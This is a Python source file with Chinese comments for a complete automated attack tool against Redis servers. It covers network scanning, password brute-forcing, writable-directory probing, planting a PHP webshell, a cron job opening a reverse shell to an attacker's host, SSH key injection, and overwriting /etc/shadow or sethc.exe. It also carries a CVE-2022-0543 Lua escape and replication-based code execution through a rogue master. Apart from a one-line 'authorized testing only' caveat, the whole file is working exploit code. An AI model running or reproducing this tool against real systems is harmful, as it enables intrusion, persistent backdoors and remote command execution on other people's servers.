#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
redis_tool.py (v9) — Redis 未授权一站式工具（加固版）

语法：redis_tool.py <目标> [动作] [选项]
动作：auto(默认) / probe / scan / dir / webshell / cron / ssh / lua / ssrf / replica / build
用 -help 看完整帮助；加 --debug 查看异常堆栈。

加固点：连接失败、文件缺失、非法 CIDR、参数错误、超时等均转为可读提示，不抛出 traceback。
仅用于授权测试。
"""
import argparse
import concurrent.futures
import ipaddress
import json
import os
import socket
import subprocess
import sys
import time
from urllib.parse import urlparse

CRLF = b"\r\n"


def _warn(msg):
    print("[!] " + msg)


# ----------------------------------------------------------------------------- 代理
def parse_proxy(p):
    if not p:
        return None
    try:
        if "://" not in p:
            p = "socks5://" + p
        u = urlparse(p)
        scheme = (u.scheme or "socks5").lower()
        default_port = 1080 if scheme.startswith("socks") else 8080
        if not u.hostname:
            raise ValueError("代理地址缺少 host")
        return {"scheme": scheme, "host": u.hostname, "port": u.port or default_port,
                "user": u.username, "pass": u.password}
    except Exception as e:  # noqa: BLE001
        _warn("代理解析失败(%s)，已忽略代理: %s" % (p, e))
        return None


def _socks5(s, host, port, user, pwd):
    if user:
        s.sendall(b"\x05\x02\x00\x02")
    else:
        s.sendall(b"\x05\x01\x00")
    r = s.recv(2)
    if len(r) < 2 or r[0] != 5:
        raise OSError("socks5 handshake failed: %r" % r)
    method = r[1]
    if method == 2:
        if not user:
            raise OSError("socks5 server requires auth")
        u = user.encode()
        p = (pwd or "").encode()
        s.sendall(b"\x01" + bytes([len(u)]) + u + bytes([len(p)]) + p)
        r = s.recv(2)
        if len(r) < 2 or r[1] != 0:
            raise OSError("socks5 auth failed")
    elif method != 0:
        raise OSError("socks5 no acceptable method: %r" % method)
    try:
        addr = b"\x01" + ipaddress.IPv4Address(host).packed
    except Exception:
        hb = host.encode()
        addr = b"\x03" + bytes([len(hb)]) + hb
    s.sendall(b"\x05\x01\x00" + addr + port.to_bytes(2, "big"))
    r = s.recv(4)
    if len(r) < 4 or r[1] != 0:
        raise OSError("socks5 connect failed: %r" % r)
    atyp = r[3]
    if atyp == 1:
        s.recv(4 + 2)
    elif atyp == 3:
        n = s.recv(1)[0]
        s.recv(n + 2)
    elif atyp == 4:
        s.recv(16 + 2)


def _http_connect(s, host, port):
    req = "CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n" % (host, port, host, port)
    s.sendall(req.encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        d = s.recv(4096)
        if not d:
            raise OSError("http proxy closed")
        buf += d
    if b" 200" not in buf.split(b"\r\n", 1)[0]:
        raise OSError("http proxy connect failed")


def open_conn(host, port, proxy=None, timeout=8):
    """连接目标（可经代理）。失败抛 OSError。"""
    if not proxy:
        return socket.create_connection((host, port), timeout=timeout)
    s = socket.create_connection((proxy["host"], proxy["port"]), timeout=timeout)
    s.settimeout(timeout)
    if proxy["scheme"].startswith("socks"):
        _socks5(s, host, port, proxy.get("user"), proxy.get("pass"))
    elif proxy["scheme"].startswith("http"):
        _http_connect(s, host, port)
    else:
        s.close()
        raise ValueError("unsupported proxy scheme: %s" % proxy["scheme"])
    return s


# ----------------------------------------------------------------------------- RESP
def enc(*args):
    out = b"*%d\r\n" % len(args)
    for a in args:
        if isinstance(a, str):
            a = a.encode()
        out += b"$%d\r\n" % len(a) + a + b"\r\n"
    return out


class Resp:
    def __init__(self, host, port, timeout=8, proxy=None):
        self.host, self.port = host, port
        self.s = open_conn(host, port, proxy, timeout)
        self.s.settimeout(timeout)
        self.buf = b""

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass

    def _fill(self):
        d = self.s.recv(65536)
        if not d:
            raise EOFError("connection closed")
        self.buf += d

    def _readline(self):
        while b"\r\n" not in self.buf:
            self._fill()
        line, self.buf = self.buf.split(b"\r\n", 1)
        return line

    def _readn(self, n):
        while len(self.buf) < n + 2:
            self._fill()
        data, self.buf = self.buf[:n], self.buf[n + 2:]
        return data

    def _reply(self):
        line = self._readline()
        t, rest = line[:1], line[1:]
        if t == b"+":
            return rest.decode(errors="replace")
        if t == b"-":
            return Exception(rest.decode(errors="replace"))
        if t == b":":
            return int(rest)
        if t == b"$":
            n = int(rest)
            if n == -1:
                return None
            return self._readn(n)
        if t == b"*":
            n = int(rest)
            if n == -1:
                return None
            return [self._reply() for _ in range(n)]
        return line

    def cmd(self, *args):
        try:
            self.s.sendall(enc(*args))
            return self._reply()
        except Exception as e:  # noqa: BLE001
            return Exception(str(e))


def txt(v):
    if isinstance(v, bytes):
        return v.decode(errors="replace")
    return v


def _info_version(r):
    out = {}
    try:
        srv = txt(r.cmd("INFO", "server"))
        if isinstance(srv, str):
            for line in srv.splitlines():
                if ":" in line:
                    k, v = line.split(":", 1)
                    if k in ("redis_version", "os", "role"):
                        out[k] = v.strip()
    except Exception:
        pass
    return out


# ----------------------------------------------------------------------------- 探测
def probe(host, port, password=None, timeout=6, proxy=None):
    info = {"target": "%s:%d" % (host, port)}
    try:
        r = Resp(host, port, timeout=timeout, proxy=proxy)
    except Exception as e:  # noqa: BLE001
        info["status"] = "closed"
        info["error"] = "%s" % e
        info["hint"] = "目标不可达/端口关闭/代理不通/防火墙拦截"
        return info, None
    try:
        authed = False
        if password:
            a = r.cmd("AUTH", password)
            if isinstance(a, Exception):
                info["status"] = "auth_failed"
                info["error"] = str(a)
                r.close()
                return info, None
            authed = True
        pong = r.cmd("PING")
        if pong == "PONG":
            if authed:
                info["status"] = "auth_ok"
            else:
                info["status"] = "unauth"
                info["unauth"] = True
        elif isinstance(pong, Exception) and "NOAUTH" in str(pong).upper():
            if not password:
                info["status"] = "auth_required"
                info["hint"] = "需要密码：用 --wordlist 爆破或 --pass 指定"
                r.close()
                return info, None
            info["status"] = "auth_ok"
        else:
            info["status"] = "other"
            info["error"] = str(pong)
            r.close()
            return info, None
        info.update(_info_version(r))
        dirv = r.cmd("CONFIG", "GET", "dir")
        if isinstance(dirv, list) and len(dirv) == 2:
            info["dir"] = txt(dirv[1])
        pm = r.cmd("CONFIG", "GET", "protected-mode")
        if isinstance(pm, list) and len(pm) == 2:
            info["protected_mode"] = txt(pm[1])
        return info, r
    except Exception as e:  # noqa: BLE001
        info["status"] = "error"
        info["error"] = str(e)
        r.close()
        return info, None


def scan_one(host, port, wordlist=None, timeout=3, proxy=None):
    target = "%s:%d" % (host, port)
    r = None
    try:
        r = Resp(host, port, timeout=timeout, proxy=proxy)
        pong = r.cmd("PING")
        if pong == "PONG":
            res = {"target": target, "status": "unauth"}
            res.update(_info_version(r))
        elif isinstance(pong, Exception) and "NOAUTH" in str(pong).upper():
            res = {"target": target, "status": "auth_required"}
            if wordlist:
                for pw in wordlist:
                    try:
                        rr = Resp(host, port, timeout=timeout, proxy=proxy)
                        if rr.cmd("AUTH", pw) == "OK":
                            res["cracked"] = pw
                            rr.close()
                            break
                        rr.close()
                    except Exception:
                        pass
        else:
            res = {"target": target, "status": "error", "error": str(pong)}
        r.close()
        r = None
        return res
    except Exception as e:  # noqa: BLE001
        if r:
            r.close()
        return {"target": target, "status": "closed", "error": str(e)}


def scan_cidr(cidr, port, wordlist=None, threads=50, timeout=3, proxy=None):
    try:
        net = ipaddress.ip_network(cidr, strict=False)
    except Exception as e:  # noqa: BLE001
        _warn("非法 CIDR/地址 %r: %s" % (cidr, e))
        return []
    ips = [str(ip) for ip in net.hosts()] or [str(net.network_address)]
    results = []
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=max(1, threads)) as ex:
            futures = {ex.submit(scan_one, ip, port, wordlist, timeout, proxy): ip for ip in ips}
            for fut in concurrent.futures.as_completed(futures):
                try:
                    results.append(fut.result())
                except Exception as e:  # noqa: BLE001
                    results.append({"target": "?", "status": "error", "error": str(e)})
    except Exception as e:  # noqa: BLE001
        _warn("批量扫描异常: %s" % e)
    results.sort(key=lambda x: x.get("target", ""))
    return results


# ----------------------------------------------------------------------------- 分诊 / 目录探测
WEBROOTS = ["/usr/share/nginx/html", "/var/www/html", "/var/www",
            "/usr/local/nginx/html", "/home/wwwroot", "/var/www/wordpress"]
DEFAULT_DIRS = [
    "/tmp", "/var/tmp", "/dev/shm", "/var/www/html", "/usr/share/nginx/html",
    "/var/spool/cron", "/etc/cron.d", "/root", "/home", "/home/redis",
    "/opt", "/var/lib/redis", "/usr/local/redis/db", ".",
    "C:\\Windows\\Temp", "C:\\Users\\Public", "C:\\inetpub\\wwwroot",
]


def _try_write(r, path):
    try:
        if isinstance(r.cmd("CONFIG", "SET", "dir", path), Exception):
            return False
        r.cmd("CONFIG", "SET", "dbfilename", ".rprobe")
        r.cmd("SET", "__rprobe__", "1")
        return r.cmd("SAVE") == "OK"
    except Exception:
        return False


def dir_probe(host, port, paths, password=None, proxy=None):
    try:
        r = Resp(host, port, proxy=proxy)
    except Exception as e:  # noqa: BLE001
        _warn("目录探测连接失败: %s" % e)
        return []
    out = []
    try:
        if password:
            r.cmd("AUTH", password)
        od = r.cmd("CONFIG", "GET", "dir")
        orig = txt(od[1]) if isinstance(od, list) and len(od) == 2 else None
        for p in paths:
            res = r.cmd("CONFIG", "SET", "dir", p)
            exists = not isinstance(res, Exception)
            writable = _try_write(r, p) if exists else False
            out.append({"path": p, "exists": exists, "writable": writable})
        r.cmd("CONFIG", "SET", "dbfilename", "dump.rdb")
        if orig:
            r.cmd("CONFIG", "SET", "dir", orig)
    except Exception as e:  # noqa: BLE001
        _warn("目录探测中断: %s" % e)
    finally:
        r.close()
    return out


# ----------------------------------------------------------------------------- 利用
def exploit_webshell(r, webroot):
    try:
        r.cmd("CONFIG", "SET", "dir", webroot)
        r.cmd("CONFIG", "SET", "dbfilename", "rsh.php")
        r.cmd("SET", "x", "<?php @system($_REQUEST[1]);?>")
        ok = r.cmd("SAVE") == "OK"
        r.cmd("CONFIG", "SET", "dbfilename", "dump.rdb")
        return ok
    except Exception:
        return False


def exploit_cron(r, cron_dir, rev_ip, rev_port):
    try:
        line = "\n\n* * * * * bash -i >& /dev/tcp/%s/%d 0>&1\n\n" % (rev_ip, rev_port)
        r.cmd("CONFIG", "SET", "dir", cron_dir)
        r.cmd("CONFIG", "SET", "dbfilename", "root" if "spool" in cron_dir else "rv")
        r.cmd("SET", "x", line)
        ok = r.cmd("SAVE") == "OK"
        r.cmd("CONFIG", "SET", "dbfilename", "dump.rdb")
        return ok
    except Exception:
        return False


def exploit_ssh(r, ssh_dir, pubkey):
    try:
        r.cmd("CONFIG", "SET", "dir", ssh_dir)
        r.cmd("CONFIG", "SET", "dbfilename", "authorized_keys")
        r.cmd("SET", "x", "\n\n%s\n\n" % pubkey.strip())
        ok = r.cmd("SAVE") == "OK"
        r.cmd("CONFIG", "SET", "dbfilename", "dump.rdb")
        return ok
    except Exception:
        return False


def _serve_payload(lport, payload, timeout):
    srv = socket.socket()
    try:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", lport))
        srv.listen(5)
        srv.settimeout(timeout)
        cli, _ = srv.accept()
        cli.settimeout(15)
        while True:
            d = cli.recv(4096)
            if not d:
                break
            u = d.upper()
            if b"PING" in u:
                cli.sendall(b"+PONG\r\n")
            elif b"REPLCONF" in u:
                cli.sendall(b"+OK\r\n")
            elif b"PSYNC" in u or b"SYNC" in u:
                rr = b"+FULLRESYNC " + b"Z" * 40 + b" 1\r\n"
                rr += b"$%d\r\n" % len(payload) + payload + b"\r\n"
                cli.sendall(rr)
                break
        cli.close()
    finally:
        srv.close()


def exploit_writefile(host, port, lhost, lport, payload, rpath, rfile, password,
                      timeout=40, proxy=None):
    try:
        r = Resp(host, port, proxy=proxy)
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "error": "连接失败: %s" % e}
    try:
        if password:
            r.cmd("AUTH", password)
        r.cmd("CONFIG", "SET", "dir", rpath)
        r.cmd("CONFIG", "SET", "dbfilename", rfile)
        r.cmd("SLAVEOF", lhost, str(lport))
        try:
            _serve_payload(lport, payload, timeout)
        except socket.timeout:
            return {"ok": False, "error": "靶机未回连（确认 lhost/lport 可达，端口未被占用）"}
        except OSError as e:
            return {"ok": False, "error": "监听 %d 失败: %s（端口被占用？）" % (lport, e)}
        time.sleep(1)
        r.cmd("SLAVEOF", "NO", "ONE")
        r.cmd("CONFIG", "SET", "dbfilename", "dump.rdb")
        return {"ok": True, "wrote": rpath.rstrip("/") + "/" + rfile, "size": len(payload)}
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "error": str(e)}
    finally:
        r.close()


def exploit_replica(host, port, lhost, lport, exp_file, password, cmd,
                    timeout=40, proxy=None):
    try:
        with open(exp_file, "rb") as f:
            payload = f.read()
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "error": "读取 exp.so 失败: %s（用 --exp 指定路径，或先 build）" % e}
    try:
        r = Resp(host, port, proxy=proxy)
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "error": "连接失败: %s" % e}
    try:
        if password:
            r.cmd("AUTH", password)
        r.cmd("CONFIG", "SET", "dir", "/tmp")
        r.cmd("CONFIG", "SET", "dbfilename", "exp.so")
        r.cmd("SLAVEOF", lhost, str(lport))
        try:
            _serve_payload(lport, payload, timeout)
        except socket.timeout:
            return {"ok": False, "error": "靶机未回连（确认 lhost/lport 可达，端口未被占用）"}
        except OSError as e:
            return {"ok": False, "error": "监听 %d 失败: %s（端口被占用？）" % (lport, e)}
        time.sleep(1)
        load = r.cmd("MODULE", "LOAD", "./exp.so")
        r.cmd("SLAVEOF", "NO", "ONE")
        if isinstance(load, Exception):
            return {"ok": False, "module_load": str(load),
                    "error": "模块加载失败（可能 Redis 7+ 禁用了 MODULE，或 exp.so 不兼容）"}
        out = r.cmd("system.exec", cmd)
        return {"ok": True, "module_load": str(load), "exec": txt(out)}
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "error": str(e)}
    finally:
        r.close()


# ----------------------------------------------------------------------------- CVE-2022-0543
LUA_PATHS = [
    "/usr/lib/x86_64-linux-gnu/liblua5.1.so.0",
    "/usr/lib/liblua5.1.so.0",
    "/usr/local/lib/liblua5.1.so.0",
    "/usr/lib/liblua5.1.so",
]
LUA_SCRIPT = """
local io_l = package.loadlib("%s", "luaopen_io");
local io = io_l();
local f = io.popen([[%s]], "r");
local res = f:read("*a");
f:close();
return res
"""


def exploit_lua(host, port, cmd, password=None, proxy=None):
    try:
        r = Resp(host, port, proxy=proxy)
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "error": "连接失败: %s" % e}
    try:
        if password:
            r.cmd("AUTH", password)
        last = None
        for lib in LUA_PATHS:
            out = r.cmd("EVAL", LUA_SCRIPT % (lib, cmd), "0")
            if isinstance(out, bytes):
                return {"ok": True, "lib": lib, "exec": out.decode(errors="replace")}
            last = str(out)
        return {"ok": False, "error": "所有 liblua 路径失败（非 Debian/Ubuntu 或已修复）", "last": last}
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "error": str(e)}
    finally:
        r.close()


# ----------------------------------------------------------------------------- SSRF
def ssrf_probe(host, port, target, password=None, proxy=None, wait=2):
    if ":" not in target:
        return {"ok": False, "error": "--ssrf 需要 host:port 形式"}
    th, _, tp = target.partition(":")
    try:
        tp = int(tp)
    except Exception:
        return {"ok": False, "error": "--ssrf 端口非法: %r" % tp}
    try:
        r = Resp(host, port, proxy=proxy)
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "error": "连接失败: %s" % e}
    try:
        if password:
            r.cmd("AUTH", password)
        r.cmd("SLAVEOF", th, str(tp))
        time.sleep(wait)
        info = txt(r.cmd("INFO", "replication")) or ""
        r.cmd("SLAVEOF", "NO", "ONE")
        if "master_link_status:up" in info:
            status = "up(疑似 redis)"
        elif "master_link_status:down" in info:
            status = "down(端口可能开但非 redis，或不通)"
        else:
            status = "unknown"
        return {"ssrf_target": target, "link_status": status, "raw": info[:400]}
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "error": str(e)}
    finally:
        r.close()


# ----------------------------------------------------------------------------- 编译 exp.so
def build_exp(sdk_dir=".", out="exp.so"):
    try:
        exp_c = None
        for root, _dirs, files in os.walk(sdk_dir):
            if "exp.c" in files:
                exp_c = os.path.join(root, "exp.c")
                break
        if not exp_c:
            return {"ok": False, "error": "在 %s 下找不到 exp.c" % sdk_dir}
        inc = os.path.dirname(exp_c)
        inc2 = os.path.dirname(inc)
        cmd = ["gcc", "-shared", "-fPIC", "-include", "string.h", "-include", "arpa/inet.h",
               "-I", inc, "-I", inc2, "-o", out, exp_c]
        try:
            p = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        except FileNotFoundError:
            return {"ok": False, "error": "本机没有 gcc。请在 VPS/入口机(Linux) 上编译。"}
        if p.returncode == 0 and os.path.exists(out):
            return {"ok": True, "out": out, "size": os.path.getsize(out)}
        return {"ok": False, "error": (p.stderr or p.stdout or "")[:500]}
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "error": str(e)}


# ----------------------------------------------------------------------------- 场景模板
def build_preset(preset, a, pw):
    rpath = a.rpath or "/tmp"
    rfile = a.rfile or "x"
    try:
        if preset == "webshell":
            return b"<?php @system($_REQUEST[1]);?>", (a.rpath or "/var/www/html"), (a.rfile or "rsh.php")
        if preset == "sshkey":
            keyfile = a.pubkey or os.path.join(os.path.expanduser("~"), ".ssh", "id_rsa.pub")
            with open(keyfile, encoding="utf-8") as f:
                key = f.read().strip()
            return ("\n\n" + key + "\n\n").encode(), (a.rpath or "/root/.ssh"), (a.rfile or "authorized_keys")
        if preset == "cron":
            if not a.rev_ip:
                raise ValueError("cron 需要 --rev-ip")
            line = "\n\n* * * * * bash -i >& /dev/tcp/%s/%d 0>&1\n\n" % (a.rev_ip, a.rev_port)
            return line.encode(), (a.rpath or "/var/spool/cron"), (a.rfile or "root")
        if preset == "shadow":
            if not a.shadow_file:
                raise ValueError("shadow 需要 --shadow-file")
            with open(a.shadow_file, "rb") as f:
                return f.read(), (a.rpath or "/etc"), (a.rfile or "shadow")
        if preset == "sethc":
            if not a.lfile:
                raise ValueError("sethc 需要 --lfile")
            with open(a.lfile, "rb") as f:
                return f.read(), (a.rpath or r"C:\Windows\System32"), (a.rfile or "sethc.exe")
        raise ValueError("未知 preset: %s" % preset)
    except Exception as e:  # noqa: BLE001
        raise ValueError(str(e))


# ----------------------------------------------------------------------------- AUTO
def run_auto(host, port, pw, wordlist, proxy, lhost, lport, rev_ip, rev_port,
             pubkey, cmd, exp, dirs):
    rep = {"target": "%s:%d" % (host, port), "success": [], "next": []}
    info, r = probe(host, port, pw, proxy=proxy)
    rep["probe"] = info
    print(json.dumps(info, ensure_ascii=False, indent=2))

    if info.get("status") in ("closed", "error"):
        rep["next"].append("目标不可达/异常：检查 IP、端口、防火墙、代理")
        return rep
    if info.get("status") == "auth_required":
        if wordlist:
            so = scan_one(host, port, wordlist, timeout=4, proxy=proxy)
            if so.get("cracked"):
                pw = so["cracked"]
                rep["success"].append("弱口令爆破成功: %s" % pw)
                print("[+] 弱口令命中: %s" % pw)
                info, r = probe(host, port, pw, proxy=proxy)
            else:
                rep["next"].append("需要密码但爆破未命中：换字典或 --pass")
                return rep
        else:
            rep["next"].append("需要密码：用 --wordlist 爆破或 --pass 指定")
            return rep
    if r is None:
        rep["next"].append("无法建立可用连接")
        return rep

    dp = dir_probe(host, port, dirs, pw, proxy=proxy)
    writable = [d["path"] for d in dp if d.get("writable")]
    rep["writable"] = writable
    if dp:
        rep["dirs"] = dp
    print("[*] 可写目录:", writable if writable else "无")

    lua = exploit_lua(host, port, cmd, pw, proxy=proxy)
    if lua.get("ok"):
        rep["success"].append("CVE-2022-0543 Lua 沙箱逃逸成功")
        print("[+] Lua 逃逸成功:", lua.get("exec"))
        rep["next"].append("Lua 已能命令执行，可直接反弹/读文件")
        r.close()
        return rep
    print("[-] Lua 逃逸不可用（非 Debian/Ubuntu 或已修复）")

    web_writable = [p for p in WEBROOTS if p in writable]
    if web_writable:
        if exploit_webshell(r, web_writable[0]):
            rep["success"].append("webshell 已写入 %s/rsh.php" % web_writable[0])
            rep["next"].append("访问 http://%s/rsh.php?1=id 验证" % host)
            print("[+] webshell:", web_writable[0])
    else:
        rep["next"].append("webroot 不可写 -> webshell 不可用")

    cron_writable = [p for p in ["/var/spool/cron", "/etc/cron.d"] if p in writable]
    if cron_writable and rev_ip:
        if exploit_cron(r, cron_writable[0], rev_ip, rev_port):
            rep["success"].append("计划任务反弹已写入 %s" % cron_writable[0])
            rep["next"].append("在 %s 上 nc -lvnp %d 等待反弹" % (rev_ip, rev_port))
            print("[+] cron 反弹:", cron_writable[0])
    elif cron_writable:
        rep["next"].append("cron 可写，但缺 --rev-ip")
    else:
        rep["next"].append("cron 不可写")

    ssh_writable = [p for p in ["/home/redis/.ssh", "/root/.ssh"] if p in writable]
    if ssh_writable and pubkey:
        try:
            with open(pubkey, encoding="utf-8") as f:
                ok = exploit_ssh(r, ssh_writable[0], f.read())
        except Exception as e:
            ok = False
            _warn("读取公钥失败: %s" % e)
        if ok:
            rep["success"].append("SSH 公钥已写入 %s" % ssh_writable[0])
            rep["next"].append("ssh -i <私钥> redis@%s 登录" % host)
            print("[+] ssh key:", ssh_writable[0])
    elif ssh_writable:
        rep["next"].append(".ssh 可写，但缺 --pubkey")
    else:
        rep["next"].append(".ssh 不可写")

    if lhost:
        res = exploit_replica(host, port, lhost, lport, exp, pw, cmd, proxy=proxy)
        if res.get("ok"):
            rep["success"].append("主从复制 RCE 成功")
            rep["next"].append("命令执行: %s" % str(res.get("exec"))[:80])
            print("[+] replica:", res)
        else:
            rep["next"].append("主从复制失败: %s" % res.get("error"))
    else:
        rep["next"].append("主从复制/无损写文件需要 --lhost（VPS 回连地址）")

    r.close()
    return rep


# ----------------------------------------------------------------------------- CLI
def _read_wordlist(path):
    if not path:
        return None
    out = []
    try:
        with open(path, encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    out.append(line)
    except Exception as e:  # noqa: BLE001
        _warn("读取字典失败(%s): %s" % (path, e))
        return None
    return out


ACTIONS = ["auto", "probe", "scan", "dir", "webshell", "cron", "ssh", "lua",
           "ssrf", "replica", "build"]


def build_parser():
    ap = argparse.ArgumentParser(prog="redis_tool.py", add_help=False,
                                 formatter_class=argparse.RawDescriptionHelpFormatter,
                                 description=__doc__)
    ap.add_argument("-h", "--help", "-help", action="help", help="显示帮助")
    ap.add_argument("target", help="目标 IP 或 CIDR")
    ap.add_argument("action", nargs="?", default="auto", choices=ACTIONS)
    ap.add_argument("--port", type=int, default=6379)
    ap.add_argument("--lhost", default=None)
    ap.add_argument("--lport", type=int, default=443)
    ap.add_argument("--pass", dest="password", default=None)
    ap.add_argument("--wordlist", default=None)
    ap.add_argument("--proxy", default=None)
    ap.add_argument("--rev-ip", dest="rev_ip", default=None)
    ap.add_argument("--rev-port", dest="rev_port", type=int, default=4444)
    ap.add_argument("--pubkey", default=None)
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--dirs", default=None)
    ap.add_argument("--dirlist", default=None)
    ap.add_argument("--ssrf", default=None)
    ap.add_argument("--threads", type=int, default=50)
    ap.add_argument("--sdk", default=".")
    ap.add_argument("--exp", default="exp.so")
    ap.add_argument("--debug", action="store_true", help="显示异常堆栈")
    ap.add_argument("-o", "--out", default=None)
    return ap


def run(a):
    proxy = parse_proxy(a.proxy)
    if proxy:
        print("[*] 代理: %s://%s:%s" % (proxy["scheme"], proxy["host"], proxy["port"]))
    pw = a.password
    wordlist = _read_wordlist(a.wordlist)
    if not pw and wordlist:
        so = scan_one(a.target, a.port, wordlist, timeout=4, proxy=proxy)
        if so.get("cracked"):
            pw = so["cracked"]
            print("[+] 弱口令命中: %s" % pw)

    rep = {"target": a.target, "action": a.action}

    if a.action == "build":
        rep["result"] = build_exp(a.sdk, a.exp)
        print(json.dumps(rep["result"], ensure_ascii=False, indent=2))

    elif a.action == "scan":
        res = scan_cidr(a.target, a.port, wordlist, a.threads, proxy=proxy)
        rep["result"] = res
        if not res:
            _warn("没有扫描结果（目标格式或网络问题）")
        hit = [x for x in res if x.get("status") == "unauth"]
        print("\n[+] 未授权 %d 个" % len(hit))
        for x in hit:
            print("    %-24s %s %s" % (x["target"], x.get("redis_version", ""), x.get("os", "")))
        for x in res:
            if x.get("cracked"):
                print("    %-24s 弱口令=%s" % (x["target"], x["cracked"]))

    elif a.action == "probe":
        info, r = probe(a.target, a.port, pw, proxy=proxy)
        rep["result"] = info
        print(json.dumps(info, ensure_ascii=False, indent=2))
        if r:
            r.close()

    elif a.action == "dir":
        paths = DEFAULT_DIRS
        if a.dirs:
            paths = [p.strip() for p in a.dirs.split(",") if p.strip()]
        elif a.dirlist:
            try:
                with open(a.dirlist, encoding="utf-8", errors="ignore") as f:
                    paths = [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
            except Exception as e:  # noqa: BLE001
                _warn("读取目录列表失败: %s，改用默认列表" % e)
        res = dir_probe(a.target, a.port, paths, pw, proxy=proxy)
        rep["result"] = res
        if not res:
            _warn("目录探测无结果（连接失败或目标拒绝 CONFIG）")
        print("[*] 目录探测:")
        for x in res:
            print("  %-34s exists=%-5s writable=%s" % (x["path"], x["exists"], x["writable"]))

    elif a.action == "webshell":
        if not a.lhost:
            _warn("webshell 需要 --lhost")
        else:
            info, r = probe(a.target, a.port, pw, proxy=proxy)
            d = {"webroots": []}
            if r:
                try:
                    for p in WEBROOTS:
                        if _try_write(r, p):
                            d["webroots"].append(p)
                    r.cmd("CONFIG", "SET", "dbfilename", "dump.rdb")
                except Exception:
                    pass
            wr = a.dirs.split(",")[0].strip() if a.dirs else (d["webroots"][0] if d["webroots"] else None)
            if wr:
                res = exploit_writefile(a.target, a.port, a.lhost, a.lport,
                                        b"<?php @system($_REQUEST[1]);?>", wr, "rsh.php", pw, proxy=proxy)
                rep["result"] = res
                print(json.dumps(res, ensure_ascii=False, indent=2))
            else:
                _warn("未发现可写 webroot；用 --dirs 指定目录（无损写），或检查目标")
            if r:
                r.close()

    elif a.action == "cron":
        if not a.lhost or not a.rev_ip:
            _warn("cron 需要 --lhost 与 --rev-ip")
        else:
            res = exploit_writefile(a.target, a.port, a.lhost, a.lport,
                                    ("\n\n* * * * * bash -i >& /dev/tcp/%s/%d 0>&1\n\n"
                                     % (a.rev_ip, a.rev_port)).encode(),
                                    "/var/spool/cron", "root", pw, proxy=proxy)
            rep["result"] = res
            print(json.dumps(res, ensure_ascii=False, indent=2))

    elif a.action == "ssh":
        if not a.lhost or not a.pubkey:
            _warn("ssh 需要 --lhost 与 --pubkey")
        else:
            try:
                with open(a.pubkey, encoding="utf-8") as f:
                    key = f.read()
            except Exception as e:  # noqa: BLE001
                _warn("读取公钥失败: %s" % e)
                key = None
            if key:
                res = exploit_writefile(a.target, a.port, a.lhost, a.lport,
                                        ("\n\n" + key.strip() + "\n\n").encode(),
                                        "/root/.ssh", "authorized_keys", pw, proxy=proxy)
                rep["result"] = res
                print(json.dumps(res, ensure_ascii=False, indent=2))

    elif a.action == "lua":
        rep["result"] = exploit_lua(a.target, a.port, a.cmd, pw, proxy=proxy)
        print(json.dumps(rep["result"], ensure_ascii=False, indent=2))

    elif a.action == "ssrf":
        if not a.ssrf:
            _warn("ssrf 需要 --ssrf host:port")
        else:
            rep["result"] = ssrf_probe(a.target, a.port, a.ssrf, pw, proxy=proxy)
            print(json.dumps(rep["result"], ensure_ascii=False, indent=2))

    elif a.action == "replica":
        if not a.lhost:
            _warn("replica 需要 --lhost")
        else:
            rep["result"] = exploit_replica(a.target, a.port, a.lhost, a.lport,
                                            a.exp, pw, a.cmd, proxy=proxy)
            print(json.dumps(rep["result"], ensure_ascii=False, indent=2))

    elif a.action == "auto":
        dirs = [p.strip() for p in a.dirs.split(",")] if a.dirs else DEFAULT_DIRS
        rep = run_auto(a.target, a.port, pw, wordlist, proxy, a.lhost, a.lport,
                       a.rev_ip or a.lhost, a.rev_port, a.pubkey, a.cmd, a.exp, dirs)
        print("\n[*] ==== AUTO 汇总 ====")
        print("[+] 成功:", rep.get("success") or "无")
        print("[!] 下一步:")
        for n in rep.get("next", []):
            print("    -", n)

    if a.out:
        try:
            with open(a.out, "w", encoding="utf-8") as f:
                json.dump(rep, f, ensure_ascii=False, indent=2)
            print("[*] 写入", a.out)
        except Exception as e:  # noqa: BLE001
            _warn("写报告失败: %s" % e)


def main():
    try:
        a = build_parser().parse_args()
    except SystemExit:
        raise
    try:
        run(a)
    except KeyboardInterrupt:
        print("\n[!] 已中断")
        sys.exit(130)
    except Exception as e:  # noqa: BLE001
        print("\n[!] 运行异常: %s" % e)
        print("    可能原因：目标不可达 / 参数不合法 / 权限不足 / 端口被占用 / 返回格式异常")
        print("    加 --debug 可查看详细堆栈")
        if getattr(a, "debug", False):
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
